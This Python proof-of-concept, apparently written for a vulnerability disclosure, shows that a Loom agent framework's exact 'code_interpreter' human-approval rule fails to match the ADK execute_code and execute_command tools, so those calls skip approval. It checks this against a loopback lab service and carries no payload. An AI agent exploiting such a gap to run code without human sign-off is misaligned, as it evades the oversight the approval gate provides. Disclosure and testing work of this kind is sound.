#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: loom-adk-ci-glob (High: 7.1)
#  Vendor: Loom (AWS)
#  Versions: Loom v1.9.0 and v1.10.3
#  Impact: exact code_interpreter approval rule misses ADK execute_code and execute_command
#  Requires: Docker, loopback only, public tag checkout
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "loom-adk-ci-glob"
_EMAIL = "abraxas.null@proton.me"

_RST = "\033[0m"
_BLD = "\033[1m"
_CYAN = (0, 255, 249)
_MAGENTA = (255, 0, 212)
_PINK = (255, 77, 224)
_GREEN = (57, 255, 20)
_GOLD = (255, 230, 0)
_AMBER = (255, 201, 70)
_RED = (255, 64, 96)
_MUTED = (140, 155, 175)
_INK = (232, 255, 248)
_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    if not _on():
        return ""
    return f"\033[38;2;{r};{g};{b}m"


def _paint(text, rgb, bold=False):
    if not text or rgb is None:
        return text or ""
    prefix = _rgb(*rgb) + (_BLD if bold else "")
    return "".join(ch if ch == " " else prefix + ch for ch in text)


def _box(inner, border):
    edge = _rgb(*border) + "║" + _RST
    return edge + " " + inner + _RST + " " + edge


def _rule(left, right, border, width):
    return _rgb(*border) + left + "═" * (width - 2) + right + _RST


def _split(text, left_end, right_start, left_rgb, right_rgb, mid_rgb=None, left_bold=False):
    return (
        _paint(text[:left_end], left_rgb, bold=left_bold)
        + _paint(text[left_end:right_start], mid_rgb)
        + _paint(text[right_start:], right_rgb)
    )


def _fit(left, right, width, fill=" "):
    gap = max(width - len(left) - len(right), 1)
    return (left + fill * gap + right)[:width].ljust(width)


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line):
    width = max(len(line), 1)
    out = []
    quoted = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        quoted ^= ch == '"'
        if ch == '"':
            color = _AMBER if quoted else _GOLD
        elif quoted:
            color = _GOLD
        else:
            color = _rain(x, width)
        out.append(_rgb(*color) + ch)
    return "".join(out) + _RST


def _banner_width(cols):
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(row) for row in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    return content_w, box_w


def _title_row(width):
    left, right = " ABRAXAS LABS", "analyze · reverse · disclose"
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _CYAN, _MUTED, left_bold=True)


def _cve_row(width):
    left, right = " " + _CVE, "authorized research only"
    rest = max(width - len(left) - len(right), 3)
    text = (left + " local lab ".center(rest)[:rest] + right)[:width].ljust(width)
    return _split(text, len(left), width - len(right), _PINK, _GREEN, mid_rgb=_MAGENTA, left_bold=True)


def _mail_row(width):
    left, right = " Mail", _EMAIL
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _GOLD, _CYAN)


def _status_line():
    marks = {"[": _GREEN, "]": _GREEN, "*": _GREEN, "·": _PINK, "#": _PINK}
    text = "[*]  abraxas!null ready on #labs"
    return "".join(ch if ch == " " else _rgb(*marks.get(ch, _INK)) + ch for ch in text) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    content_w, box_w = _banner_width(cols)
    lines = [
        _rule("╔", "╗", _CYAN, box_w),
        _box(_title_row(content_w) + _RST, _CYAN),
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_cve_row(content_w) + _RST, _MAGENTA),
        _rule("╠", "╣", _MAGENTA, box_w),
    ]
    for glyph in _ART["abraxas"] + _ART["labs"]:
        vis = glyph[:content_w].ljust(content_w)
        lines.append(_box(_logo_line(vis), _MAGENTA))
    lines.extend([
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_mail_row(content_w) + _RST, _MAGENTA),
        _rule("╚", "╝", _CYAN, box_w),
        " " + _status_line(),
    ])
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _message_color(s):
    low = s.lower()
    stripped = s.lstrip()
    if low.startswith("success"):
        return _rgb(*_GREEN) + _BLD
    if low.startswith("fail"):
        return _rgb(*_RED) + _BLD
    if "user_id" in low:
        return _rgb(*_AMBER) + _BLD
    if low.startswith("status=") or "status=" in low[:20]:
        return _rgb(*_CYAN)
    if low.startswith("carrier"):
        return _rgb(*_MAGENTA)
    if stripped[:1] in "{[":
        return _rgb(*_GOLD)
    return _rgb(*_INK)


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    dest = kwargs.get("file", _sys.stdout)
    if dest is not _sys.stdout and dest is not _sys.stderr:
        _PRINT(*args, **kwargs)
        return
    extra = {k: v for k, v in kwargs.items() if k != "sep"}
    _PRINT(_message_color(s) + s + _RST, **extra)

print_abraxas_banner()
_PRINT = _builtins.print
_builtins.print = _cprint

"""Loom v1.9.0: exact Method 1 rule code_interpreter misses ADK execute tools.

CWE-862. Reach: remote. Class: HITL skip / tool-name glob miss.
The product matcher is ApprovalPolicyMatcher.find_matching_policy.
"""

import ast
import hashlib
import json
import os
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any, NoReturn

LABEL = "LOOM-190-ADK-CI-GLOB"
WITNESS = "LOOM-190-ADK-CI-GLOB-WITNESS"
LAB_URL = os.environ.get("LAB_URL", "http://127.0.0.1:18750").rstrip("/")
MATCHER_ID = "src.integrations.approval.ApprovalPolicyMatcher"
EXACT_RULE = "code_interpreter"
EXECUTE_CODE = "code_interpreter_execute_code"
EXECUTE_COMMAND = "code_interpreter_execute_command"

ROOT = Path(__file__).resolve().parent
SRC = ROOT / "src-v1.9.0"
APPROVAL_PY = SRC / "agents" / "adk_agent" / "src" / "integrations" / "approval.py"
CI_PY = SRC / "agents" / "adk_agent" / "src" / "integrations" / "code_interpreter.py"
STRANDS_AGENT_PY = SRC / "agents" / "strands_agent" / "src" / "agent.py"


def log(msg: str) -> None:
    print(msg, flush=True)


def die(reason: str) -> NoReturn:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    raise SystemExit(1)


def function_tool_names(source: str) -> list[str]:
    tree = ast.parse(source)
    names: list[str] = []
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        func = node.func
        if not isinstance(func, ast.Name) or func.id != "FunctionTool":
            continue
        if not node.args or not isinstance(node.args[0], ast.Name):
            continue
        names.append(node.args[0].id)
    return names


def strands_ci_tools(source: str) -> list[str]:
    tree = ast.parse(source)
    found: list[str] = []
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        func = node.func
        if not isinstance(func, ast.Attribute) or func.attr != "append":
            continue
        if not isinstance(func.value, ast.Name) or func.value.id != "tools":
            continue
        if not node.args or not isinstance(node.args[0], ast.Attribute):
            continue
        arg = node.args[0]
        if isinstance(arg.value, ast.Name) and arg.value.id == "ci":
            found.append(arg.attr)
    return found


def _sha256(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def http(method: str, path: str, payload: dict[str, Any] | None = None, timeout: int = 10) -> tuple[int, str]:
    url = path if path.startswith("http") else f"{LAB_URL}{path}"
    data = None
    headers = {"Accept": "application/json"}
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return int(resp.status), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return int(exc.code), exc.read().decode("utf-8", "replace")
    except urllib.error.URLError as exc:
        reason = exc.reason if isinstance(exc.reason, str) else exc.reason.__class__.__name__
        return 0, reason


def parse(body: str) -> dict[str, Any]:
    try:
        data = json.loads(body)
    except json.JSONDecodeError:
        return {}
    return data if isinstance(data, dict) else {}


def yn(flag: bool) -> str:
    return "yes" if flag else "no"


def ask(tool_name: str, rules: list[str]) -> bool:
    code, body = http("POST", "/match", {"tool_name": tool_name, "tool_match_rules": rules})
    data = parse(body)
    if code != 200 or data.get("ok") is not True:
        die(f"match-http={code} tool={tool_name} rules={rules}")
    if data.get("tool_name") != tool_name or data.get("tool_match_rules") != rules:
        die(f"match-echo tool={tool_name}")
    if data.get("policy_type") != "loop_hook" or data.get("approval_mode") != "require_approval":
        die("match-policy-shape")
    if data.get("matcher") != MATCHER_ID:
        die("match-matcher")
    matched = data.get("matched")
    if not isinstance(matched, bool):
        die(f"match-flag tool={tool_name}")
    return matched


def _read(path: Path) -> str:
    if not path.is_file():
        die(f"missing-product {path.name}")
    return path.read_text(encoding="utf-8")


def main() -> int:
    approval = _read(APPROVAL_PY)
    ci_source = _read(CI_PY)
    strands_source = _read(STRANDS_AGENT_PY)
    tool_names = function_tool_names(ci_source)
    strands_tools = strands_ci_tools(strands_source)
    log(f"ioc function-tools={','.join(tool_names)}")
    log(f"ioc strands-tools={','.join(strands_tools)}")
    log(f"ioc product-fnmatch={yn('fnmatch.fnmatch' in approval)}")

    if EXACT_RULE in tool_names:
        die("leftover-closed product-function-tool-name=code_interpreter")
    if EXECUTE_CODE not in tool_names or EXECUTE_COMMAND not in tool_names:
        die(f"product-execute-names-missing tools={','.join(tool_names)}")
    if strands_tools != [EXACT_RULE]:
        die(f"strands-register got={','.join(strands_tools)}")

    code, body = http("GET", "/health")
    health = parse(body)
    if code != 200 or health.get("ok") is not True:
        die(f"health-http={code}")
    if health.get("matcher") != MATCHER_ID or health.get("matcher_file") != "src/integrations/approval.py":
        die("health-matcher")
    if health.get("function_tools") != tool_names or health.get("strands_tools") != strands_tools:
        die("image-name-drift")
    if health.get("approval_sha256") != _sha256(APPROVAL_PY):
        die("image-approval-drift")
    if health.get("code_interpreter_sha256") != _sha256(CI_PY):
        die("image-code-interpreter-drift")
    if health.get("strands_agent_sha256") != _sha256(STRANDS_AGENT_PY):
        die("image-strands-drift")
    if health.get("product_fnmatch") is not True:
        log("ioc product-fnmatch-image=no")
    log(f"ioc matcher={MATCHER_ID}")

    exact = [EXACT_RULE]
    strands_hit = ask(EXACT_RULE, exact)
    code_hit = ask(EXECUTE_CODE, exact)
    command_hit = ask(EXECUTE_COMMAND, exact)
    star_ok = ask(EXECUTE_CODE, ["*"]) and ask(EXECUTE_COMMAND, ["*"])
    empty_ok = ask(EXECUTE_CODE, []) and ask(EXECUTE_COMMAND, [])
    glob_ok = ask(EXECUTE_CODE, ["code_interpreter*"]) and ask(EXECUTE_COMMAND, ["code_interpreter*"])

    strands_ioc = f"strands-name-matches={yn(strands_hit)}"
    code_ioc = f"adk-execute-code-matches={yn(code_hit)}"
    command_ioc = f"adk-execute-command-matches={yn(command_hit)}"
    star_ioc = f"star-matches-adk={yn(star_ok)}"
    empty_ioc = f"empty-matches-adk={yn(empty_ok)}"
    glob_ioc = f"glob-star-matches-adk={yn(glob_ok)}"
    for line in (strands_ioc, code_ioc, command_ioc, f"{star_ioc} {empty_ioc}", glob_ioc):
        log(f"ioc {line}")

    detail = f"{strands_ioc} {code_ioc} {command_ioc} {star_ioc} {empty_ioc} {glob_ioc}"
    if code_hit or command_hit:
        die(f"leftover-closed {detail}")
    if not strands_hit:
        die(f"strands-name-miss {detail}")
    if not (star_ok and empty_ok and glob_ok):
        log("ioc control-miss=different-bug")
    log(f"SUCCESS {LABEL} {detail} {WITNESS}")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except SystemExit:
        raise
    except Exception as exc:
        log(f"FAIL {LABEL} poc-exception {type(exc).__name__} {WITNESS}")
        raise SystemExit(1)

